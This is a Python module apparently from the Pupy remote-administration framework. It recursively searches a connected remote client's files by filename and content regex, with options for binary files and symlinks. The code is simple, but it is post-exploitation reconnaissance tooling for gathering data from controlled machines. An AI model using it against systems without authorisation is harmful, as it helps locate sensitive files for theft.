# -*- coding: utf-8 -*-
from pupylib.PupyModule import *
import os
from pupylib.utils.term import colorize

__class_name__="SearchModule"

@config(cat="gather")
class SearchModule(PupyModule):
    """ walk through a directory and recursively search a string into files """
    dependencies = [ 'pupyutils.search', 'scandir' ]

    terminate = None

    def init_argparse(self):
        self.arg_parser = PupyArgumentParser(prog="search", description=self.__doc__)
        self.arg_parser.add_argument('-p', '--path', default='.', help='root path to start (default: current path)')
        self.arg_parser.add_argument('-m','--max-size', type=int, default=20000000, help='max file size (default 20 Mo)')
        self.arg_parser.add_argument('-b', '--binary', action='store_true', help='search content inside binary files')
        self.arg_parser.add_argument('-L', '--links', action='store_true', help='follow symlinks')
        self.arg_parser.add_argument('-N', '--no-content', action='store_true', help='if string matches, output just filename')
        self.arg_parser.add_argument('filename', type=str, metavar='filename', help='regex to search (filename)')
        self.arg_parser.add_argument('strings', nargs='*', default=[], type=str,
                                         metavar='string', help='regex to search (content)')

    def run(self, args):
        self.terminate = self.client.conn.modules['threading'].Event()

        s = self.client.conn.modules['pupyutils.search'].Search(
            args.filename,
            strings=args.strings,
            max_size=args.max_size,
            root_path=args.path,
            follow_symlinks=args.links,
            no_content=args.no_content,
            terminate=self.terminate
        )

        for res in s.run():
            if args.strings and not args.no_content:
                self.success('{}: {}'.format(*res))
            else:
                self.success('{}'.format(res))

            if self.terminate.is_set():
                break

        self.info("complete")

    def interrupt(self):
        if self.terminate:
            self.terminate.set()
